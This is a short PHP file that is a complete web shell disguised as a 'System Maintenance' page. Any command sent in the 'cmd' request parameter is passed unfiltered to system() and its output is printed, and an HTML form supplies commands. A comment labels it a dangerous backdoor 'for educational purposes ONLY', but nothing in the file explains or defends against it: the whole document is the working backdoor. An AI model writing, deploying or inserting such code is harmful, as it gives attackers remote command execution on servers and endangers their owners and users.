<?php
// Extremely dangerous backdoor script - for educational purposes ONLY
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    echo system($cmd);
    echo "</pre>";
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>System Maintenance</title>
</head>
<body>
    <h1>System Maintenance</h1>
    <form method="post">
        <input type="text" name="cmd" placeholder="Enter system command">
        <button type="submit">Execute</button>
    </form>
</body>
</html>